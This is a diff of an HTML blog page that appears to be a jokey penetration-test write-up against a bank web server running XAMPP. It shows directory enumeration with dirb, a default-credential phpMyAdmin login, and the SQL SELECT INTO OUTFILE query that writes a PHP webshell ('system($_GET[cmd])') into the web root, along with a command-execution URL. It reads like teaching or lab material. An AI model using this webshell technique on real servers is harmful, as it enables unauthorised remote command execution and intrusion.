@@ -992,24 +992,73 @@
 <p>It all started with a simple directory listing. Because why secure your webserver when you can just hand out your internal file structure to anyone with an internet connection? I ran:
 <div class="highlight"><pre><span></span><code>dirb<span class="w"> </span>http://targetbank.com/
 </code></pre></div>
-Boom. A treasure trove of exposed files, including a <code>/phpmyadmin/</code> folder.</p>
-<div class="highlight"><pre><span></span><code>[ Pentester ]  ---&gt;  [ Web Server ]
-    /----------------------------------------------------------\
-    | xampp/
-    | ├── htdocs/             # Web root directory
-    | │   ├── index.php       # Default XAMPP homepage
-    | │   ├── dashboard/      # XAMPP dashboard files
-    | │   ├── applications.html
-    | │   ├── img/            # Images for XAMPP dashboard
-    | │   ├── webalizer/      # Webalizer logs
-    | │   ├── server-status   # Server status info
-    | ├── phpMyAdmin/         # phpMyAdmin directory &lt;------- Found using dirb
-    | │   ├── index.php       # Main entry point for phpMyAdmin
-    | │   ├── config.inc.php  # Configuration file
-    | │   ├── libraries/      # Libraries used by phpMyAdmin
-    | │   ├── themes/         # Themes for phpMyAdmin
-    | │   ├── ...
-    \-----------------------------------------------------------/
+Boom. A treasure trove of exposed files, including a <code>/phpmyadmin/</code> folder.
+At that moment, the attack pathway drew itself on my mind.
+(Since you can't read minds, I've decided to write it down below.)</p>
+<div class="highlight"><pre><span></span><code><span class="w">    </span>+------------------------+
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>Hacker<span class="s1">&#39;s Computer   |  </span>
+<span class="s1">    |    (Attacker)          |  </span>
+<span class="s1">    +------------------------+</span>
+<span class="s1">              |</span>
+<span class="s1">              | Sends HTTP request: </span>
+<span class="s1">              | `GET /phpmyadmin/ HTTP/1.1`</span>
+<span class="s1">              v</span>
+<span class="s1">    +------------------------+</span>
+<span class="s1">    |     XAMPP Web Server   |  </span>
+<span class="s1">    |   (bankserver:80)      |</span>
+<span class="s1">    |  +-------------------+ |</span>
+<span class="s1">    |  |  htdocs/          | |</span>
+<span class="s1">    |  |  + index.php      | |</span>
+<span class="s1">    |  |  + dashboard/     | |</span>
+<span class="s1">    |  |  + server-status  | |</span>
+<span class="s1">    |  |  + ...            | |</span>
+<span class="s1">    |  +-------------------+ |</span>
+<span class="s1">    |  +-------------------+ |</span>
+<span class="s1">    |  | phpMyAdmin/       | |</span>
+<span class="s1">    |  |  + index.php      | |  &lt;-- phpMyAdmin login page</span>
+<span class="s1">    |  |  + config.inc.php | |</span>
+<span class="s1">    |  |  + libraries/     | |</span>
+<span class="s1">    |  |  + themes/        | |</span>
+<span class="s1">    |  +-------------------+ |</span>
+<span class="s1">    +------------------------+</span>
+<span class="s1">              |</span>
+<span class="s1">              | Hacker accesses the phpMyAdmin login page: </span>
+<span class="s1">              | `http://bankserver/phpmyadmin/`</span>
+<span class="s1">              v</span>
+<span class="s1">    +------------------------+</span>
+<span class="s1">    |    phpMyAdmin Login    |  </span>
+<span class="s1">    |    Page Exposed       |</span>
+<span class="s1">    |    (Hacker logs in)   |</span>
+<span class="s1">    +------------------------+</span>
+<span class="s1">              |</span>
+<span class="s1">              | Hacker executes a malicious query using `SELECT INTO OUTFILE`:</span>
+<span class="s1">              | `SELECT &#39;</span>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&quot;cmd&quot;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;<span class="s1">&#39; INTO OUTFILE &#39;</span>C:<span class="se">\\</span>xampp<span class="se">\\</span>htdocs<span class="se">\\</span>shell.php<span class="s1">&#39;;`</span>
+<span class="s1">              v</span>
+<span class="s1">    +-----------------------------------------------------+</span>
+<span class="s1">    |   SQL Query Execution                               |  </span>
+<span class="s1">    |   `SELECT INTO OUTFILE` command creates a webshell: |</span>
+<span class="s1">    |   - `shell.php` containing:                         |</span>
+<span class="s1">    |     `&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;`                |</span>
+<span class="s1">    +-----------------------------------------------------+</span>
+<span class="s1">              |</span>
+<span class="s1">              | File `shell.php` is created in the XAMPP document root:</span>
+<span class="s1">              | `C:\xampp\htdocs\shell.php`</span>
+<span class="s1">              v</span>
+<span class="s1">    +---------------------------------+</span>
+<span class="s1">    |    Server&#39;</span>s<span class="w"> </span>File<span class="w"> </span>System<span class="w">         </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">     </span><span class="o">(</span>Webshell<span class="w"> </span>Created<span class="o">)</span><span class="w">          </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">     </span>-<span class="w"> </span>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\s</span>hell.php<span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>+---------------------------------+
+<span class="w">              </span><span class="p">|</span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>Hacker<span class="w"> </span>accesses<span class="w"> </span>the<span class="w"> </span>webshell<span class="w"> </span>via:
+<span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>http://bankserver/shell.php?cmd<span class="o">=</span>whoami<span class="sb">`</span>
+<span class="w">              </span>v
+<span class="w">    </span>+--------------------------------------------------------+
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>Webshell<span class="w"> </span>Execution<span class="w">                                  </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>-<span class="w"> </span>Hacker<span class="w"> </span>sends<span class="w"> </span>GET<span class="w"> </span>request<span class="w">                          </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">      </span>to<span class="w"> </span>execute<span class="w"> </span>arbitrary<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>server<span class="w">       </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>-<span class="w"> </span>Example:<span class="w"> </span><span class="sb">`</span>http://bankserver/shell.php?cmd<span class="o">=</span>whoami<span class="sb">`</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>+--------------------------------------------------------+
 </code></pre></div>
 <h3 id="step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-surprise">Step 2: Oh Look, PhpMyAdmin – Let’s Try Defaults and give them a surprise!<a class="headerlink" href="#step-2-oh-look-phpmyadmin-lets-try-defaults-and-give-them-a-surprise" title="Permanent link">&para;</a></h3>
 <p>I took a gamble and tried the usual default credentials:
@@ -1021,11 +1070,11 @@ With full control over the database, I simply used <code>SELECT INTO OUTFILE</co
 <div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">&#39;C:/xampp/htdocs/shell.php&#39;</span><span class="p">;</span>
 </code></pre></div>
 Boom. Webshell live at <code>http://bankserver/shell.php</code>.</p>
-<div class="highlight"><pre><span></span><code>+-----------------------------+
-| Web Shell Created           |
-| URL: /shell.php             |
+<div class="highlight"><pre><span></span><code>+--------------------------------+
+| Web Shell Created              |
+| URL: /shell.php                |
 | Command: system($_GET[&#39;cmd&#39;]); |
-+-----------------------------+
++--------------------------------+
 </code></pre></div>
 <h3 id="step-3-making-myself-at-home-persistence-101">Step 3: Making Myself at Home (Persistence 101)<a class="headerlink" href="#step-3-making-myself-at-home-persistence-101" title="Permanent link">&para;</a></h3>
 <p>Checking the privileges, I realized XAMPP was running under NT AUTHORITY\SYSTEM. Oh, this was going to be fun. <strong>Rookie mistake #3.</strong>
